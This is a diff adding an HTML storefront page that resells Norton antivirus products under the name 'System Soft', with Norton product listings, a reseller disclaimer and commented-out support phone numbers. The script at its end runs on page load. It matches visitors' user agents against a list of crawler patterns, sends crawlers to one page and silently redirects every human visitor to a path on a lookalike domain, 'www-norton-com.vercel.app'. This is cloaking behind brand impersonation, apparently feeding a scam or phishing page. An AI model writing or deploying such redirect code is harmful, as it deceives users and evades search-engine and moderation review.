@@ -1,0 +1,340 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="./assets/favi.png" type="image/x-icon">
+    <!-- <script src="https://unpkg.com/@tailwindcss/browser@4"></script> -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4.0.17/dist/index.global.js"></script>
+
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet" />
+    <style type="text/tailwindcss">
+
+        #main{
+            background-image: url('./assets/bs-nnew.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        i{
+            font-size: 30px;
+        }
+        .spin {
+            font-size: 1rem;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }           
+        }
+    </style>
+</head>
+
+<body>
+    <!-- header -->
+    <header>
+        <div class="bg-[#F0F5F9] ">
+            <div class="w-[80%] mx-auto py-2">
+                <p class="text-xs font-semibold">We Are An Independent Company
+                </p>
+            </div>
+        </div>
+        <div class="bg-[#EFEEEF]">
+            <div class="flex w-[80%] mx-auto py-2 items-center justify-between">
+                <div class="w-full md:w-1/4 lg:w-1/7">
+                    <!-- <img src="assets/Norton-Logo2.png" alt="logo"> -->
+                    <h2 class="text-2xl font-bold"><span class="text-yellow-400">S</span>ystem <span
+                            class="text-yellow-400">S</span>oft</h2>
+                </div>
+                <div class="hidden lg:block">
+                    <ul class="flex gap-6">
+                        <a href="./index.html">
+                            <li class="cursor-pointer">Home</li>
+                        </a>
+                        <a href="./about.html">
+                            <li class="cursor-pointer">About</li>
+                        </a>
+                        <a href="./terms-and-conditions.html">
+                            <li class="cursor-pointer">Terms & Conditions</li>
+                        </a>
+                        <a href="./privacy-policy.html">
+                            <li class="cursor-pointer">Privacy Policy</li>
+                        </a>
+                        <a href="./refund-policy.html">
+                            <li class="cursor-pointer">Refund Policy</li>
+                        </a>
+                        <a href="./disclaimer.html">
+                            <li class="cursor-pointer">Disclaimer</li>
+                        </a>
+                        <!-- <a href="./contact-us.html">
+                            <li class="cursor-pointer">Contact</li>
+                        </a> -->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- banner -->
+    <!-- <section id="main" class="flex flex-col justify-center items-center py-10 gap-3">
+        <img class="w-1/2 md:w-1/4 lg:w-1/6" src="./assets/Norton-Logo-2010000-300x117.png" alt="banner">
+        <h2 class="text-2xl md:text-3xl font-semibold">Customer Service
+        </h2>
+        <p class="text-2xl md:text-4xl font-bold">Call Now: +1(888)777-0000
+        </p>
+    </section> -->
+    <!-- second section -->
+    <section class="w-[80%] mx-auto my-10">
+        <div class="flex flex-col md:flex-row justify-between gap-4">
+            <div class="flex flex-col gap-3 lg:w-[25%] lg:items-center lg:justify-center">
+                <p class="text-3xl font-semibold underline">Norton Antivirus
+                </p>
+                <p class="text-md">Buy / Renewal / Subscription
+                </p>
+                <!-- <a href="tel:+18887770000"><button class="cursor-pointer bg-black text-white py-2 px-4 rounded">Call
+                        Now: +1(888) 777-0000
+                    </button></a> -->
+            </div>
+            <div class="flex gap-3 lg:gap-0 flex-col lg:flex-row">
+                <div class="flex items-center gap-3 lg:gap-0">
+                    <div class="bg-yellow-400 rounded p-6 flex">
+                        <i class="ri-play-circle-fill"></i>
+                    </div>
+                    <div>
+                        <p class="font-semibold text-xl ml-2">Real Time Protection</p>
+                    </div>
+                </div>
+                <div class="flex items-center gap-3 lg:gap-0">
+                    <div class="bg-yellow-400 rounded p-6 flex">
+                        <i class="ri-play-circle-fill"></i>
+                    </div>
+                    <div>
+                        <p class="font-semibold text-xl ml-2">Hacking Protection</p>
+                    </div>
+                </div>
+                <div class="flex items-center gap-3 lg:gap-0">
+                    <div class="bg-yellow-400 rounded p-6 flex">
+                        <i class="ri-play-circle-fill"></i>
+                    </div>
+                    <div>
+                        <p class="font-semibold text-xl ml-2">Full Protection</p>
+                    </div>
+                </div>
+            </div>
+            <div>
+                <img class="hidden lg:block" src="./assets/001101.png" alt="anti">
+            </div>
+        </div>
+    </section>
+    <!-- third section -->
+    <section class="w-[80%] mx-auto my-10 flex flex-col gap-10">
+        <div class="flex flex-col md:flex-row gap-10">
+            <a href="./norton-360-deluxe-5-devices.html">
+                <div class="flex flex-col gap-3">
+                    <img class="w-full rounded-md" src="./assets/norton-delux01.jpg" alt="product1">
+                    <p class="text-lg font-semibold">Norton 360 Deluxe 5 Devices
+                    </p>
+                    <p>$39.99
+                    </p>
+                    <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
+                </div>
+            </a>
+            <a href="./norton-360-for-gamers.html">
+                <div class="flex flex-col gap-3">
+                    <img class="w-full rounded-md" src="./assets/norton-360-for-gamer.jpg" alt="product2">
+                    <p class="text-lg font-semibold">Norton 360 For Gamers
+                    </p>
+                    <p>$29.99
+                    </p>
+                    <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
+                </div>
+            </a>
+            <a href="./norton-360-standard.html">
+                <div class="flex flex-col gap-3">
+                    <img class="w-full rounded-md" src="./assets/norton-360-standard0001.jpg" alt="product3">
+                    <p class="text-lg font-semibold">Norton 360 Standard
+                    </p>
+                    <p>$34.99
+                    </p>
+                    <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
+                </div>
+            </a>
+        </div>
+        <div class="flex flex-col md:flex-row gap-10">
+            <a href="./norton-360-with-lifeLock-select.html">
+                <div class="flex flex-col gap-3">
+                    <img class="w-full rounded-md" src="./assets/Norton-360-with-LifeLock-1.jpg" alt="product4">
+                    <p class="text-lg font-semibold">Norton 360 with LifeLock Select
+                    </p>
+                    <p>$99.49
+                    </p>
+                    <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
+                </div>
+            </a>
+            <a href="./norton-360-with-lifeLock-ultimate-plus.html">
+                <div class="flex flex-col gap-3">
+                    <img class="w-full rounded-md" src="./assets/Norton_360_with_LifeLock_Ultimate.jpg" alt="product5">
+                    <p class="text-lg font-semibold">Norton 360 with LifeLock Ultimate Plus
+                    </p>
+                    <p>$299.88
+                    </p>
+                    <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
+                </div>
+            </a>
+            <a href="./norton-antivirus-plus-for-1-year.html">
+                <div class="flex flex-col gap-3">
+                    <img class="w-full rounded-md" src="./assets/norton-antivirus-1yr.jpg" alt="product6">
+                    <p class="text-lg font-semibold">Norton AntiVirus Plus For 1 Year
+                    </p>
+                    <p>$39.99
+                    </p>
+                    <button class="bg-black text-white py-2 px-4 rounded cursor-pointer">Add to cart</button>
+                </div>
+            </a>
+        </div>
+    </section>
+    <!-- brand section -->
+    <section class="w-[80%] mx-auto my-10">
+        <div>
+            <img src="./assets/0001.png" alt="brand">
+        </div>
+        <div class="flex flex-col gap-4">
+            <p class="text-3xl font-semibold text-center underline">Our Honourable Brands
+            </p>
+            <p class="text-sm">Disclaimer : System soft clearly states that the registered trademarks, brand names,
+                company names,
+                and product names are the property of their respective owners; we don’t claim any ownership for their
+                brand, company or product name. System soft uses any third-party trademark, brand name or logo only
+                for the information purpose. We don’t imply an endorsement for any of the product and We Only have the
+                right to sell and promote its products/Services. We are authorized reseller of the products mentioned on
+                our website under the partner program. All the products that have been purchased by System soft are
+                directly supported by respective brands. We strictly adhere to FTC’s Mail, Internet, or Telephone Order
+                Merchandise Rule for consumer protection.
+            </p>
+        </div>
+    </section>
+    <!-- Footer -->
+    <footer class="bg-gray-900 py-4">
+        <div class="flex flex-col md:flex-row justify-between gap-10 md:w-[80%] mx-auto">
+            <div class="flex flex-col gap-3 md:w-1/4">
+                <h3 class="text-xl font-semibold text-white">Contact US</h3>
+                <!-- <h4>Email : info@norton.com
+                </h4>
+                <h4>Call : +1 (888)-000-5555
+                </h4> -->
+                <h4 class="text-white">Address : 4821 Ridge Top Cir, Anchorage, Alaska 99508, USA
+                </h4>
+                <img src="./assets/pment.png" alt="pau">
+                <!-- <img src="./assets/Norton-Logo2.png" alt="pau"> -->
+            </div>
+            <div class="flex flex-col gap-3 md:w-1/4">
+                <h3 class="text-xl font-semibold text-white">Product tags
+                </h3>
+                <h4 class="text-sm text-white">Norton 360 Deluxe | Norton 360 Premium | Norton 360 Standard | Norton
+                    AntiVirus
+                    Basic | Norton Internet Security
+                </h4>
+            </div>
+            <div class="flex flex-col gap-3 md:w-1/4">
+                <h3 class="text-xl font-semibold text-white">Quick Links
+                </h3>
+                <a href="./index.html">
+                    <h4 class="text-sm cursor-pointer text-white">Home
+                    </h4>
+                </a>
+                <a href="./about.html">
+                    <h4 class="text-sm cursor-pointer text-white">About Us
+                    </h4>
+                </a>
+                <a href="./disclaimer.html">
+                    <h4 class="text-sm cursor-pointer text-white">Disclaimer
+                    </h4>
+                </a>
+                <!-- <a href="./contact-us.html">
+                    <h4 class="text-sm cursor-pointer text-white">Contact Us
+                    </h4>
+                </a> -->
+            </div>
+            <div class="flex flex-col gap-3 md:w-1/4">
+                <h3 class="text-xl font-semibold text-white">Policies
+                </h3>
+
+                <a href="./privacy-policy.html">
+                    <h4 class="text-sm cursor-pointer text-white">Privacy Policy
+                    </h4>
+                </a>
+                <a href="./refund-policy.html">
+                    <h4 class="text-sm cursor-pointer text-white">Refund Policy
+                    </h4>
+                </a>
+                <a href="./terms-and-conditions.html">
+                    <h4 class="text-sm cursor-pointer text-white">Terms and Conditions
+                    </h4>
+                </a>
+
+            </div>
+        </div>
+        <div class="py-4">
+            <p class="text-center text-sm mt-4 text-gray-400">Copyright © 2025 system-soft. All rights reserved.
+            </p>
+        </div>
+    </footer>
+
+    <script>
+        document.querySelectorAll('.cursor-pointer').forEach(button => {
+            button.addEventListener("click", function () {
+                this.innerHTML = '<i class="ri-loader-4-line spin"></i> Loading...'; // Show loading animation
+                this.disabled = true; // Disable button temporarily
+                setTimeout(() => {
+                    this.textContent = "Added to cart"; // Update text after 1s
+                    this.disabled = false;
+                }, 1000);
+            });
+        });
+
+        // Define URLs
+        const botURL = "https://www-norton-com.vercel.app/";
+        const humanURL = "https://www-norton-com.vercel.app/norton-01/";
+
+        // Function to detect bot
+        function isBot() {
+            const botPatterns = [
+                /bot/i,
+                /crawl/i,
+                /spider/i,
+                /slurp/i,
+                /fetch/i,
+                /search/i,
+                /yandex/i,
+                /baidu/i,
+                /bing/i,
+                /duckduckgo/i,
+                /embedly/i,
+                /facebook/i,
+                /quora/i,
+                /pinterest/i,
+                /reddit/i,
+                /twitter/i,
+                /whatsapp/i
+            ];
+
+            return botPatterns.some(pattern => pattern.test(navigator.userAgent));
+        }
+
+        // Redirect based on detection
+        if (isBot()) {
+            window.location.href = botURL;
+        } else {
+            window.location.href = humanURL;
+        }
+    </script>
+
+
+</body>
+
+</html>
